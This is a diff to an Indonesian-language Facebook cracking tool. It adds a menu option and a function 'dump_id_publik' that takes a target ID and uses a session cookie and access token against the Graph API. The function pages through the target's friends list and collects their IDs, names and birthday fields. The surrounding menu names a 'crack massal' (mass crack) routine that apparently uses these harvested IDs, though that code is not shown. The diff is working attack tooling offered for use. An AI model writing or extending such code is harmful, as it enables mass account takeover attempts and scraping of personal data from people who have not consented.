@@ -1069,6 +1069,12 @@ def menu():
         setting()
     elif HaHi in ["2", "02"]:
         massal()
+    elif HaHi in ["1", "01"]:
+        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
+        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
+        dump_id_publik(idfac,"",{"cookie":cookie},token)
+        print('\n')
+        exit()
     elif HaHi in ["3", "03"]:
         result()
     elif HaHi in ["4", "04"]:
@@ -1097,7 +1103,31 @@ def dump_publikk(idfac,fields,cookie,token):
         dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
     except: pass
 
+#----------[ DUMP-ID-PUBLIK  ]----------#
+def dump_id_publik(idfac_list, fields, cookie, token):
+    if isinstance(idfac_list, str): idfac_list = [idfac_list]
+    id_dump = []
+    headers = {"connection":"keep-alive","accept":"*/*","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","sec-fetch-user":"?1","sec-ch-ua-mobile":"?1","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9"}
 
+    for idfac in idfac_list:
+        after = None
+        while True:
+            try:
+                if after: params = {"access_token":token,"fields":f"name,friends.fields(id,name,birthday).after({after})"}
+                else: params = {"access_token":token,"fields":"name,friends.fields(id,name,birthday)"}
+                url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
+                for i in url["friends"]["data"]:
+                    identitas = f'{i["id"]}|{i["name"]}'
+                    if identitas not in id_dump:
+                        id_dump.append(identitas)
+                        sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id_dump)} ID")
+                        sys.stdout.flush()
+                if "next" in url["friends"].get("paging", {}): after = url["friends"]["paging"]["cursors"]["after"]
+                else: break
+            except: break
+
+    print(f"\nSelesai dump total: {len(id_dump)} ID")
+    return id_dump
 #----------[ CRACK-massal  ]----------#
 def massal():
     global id
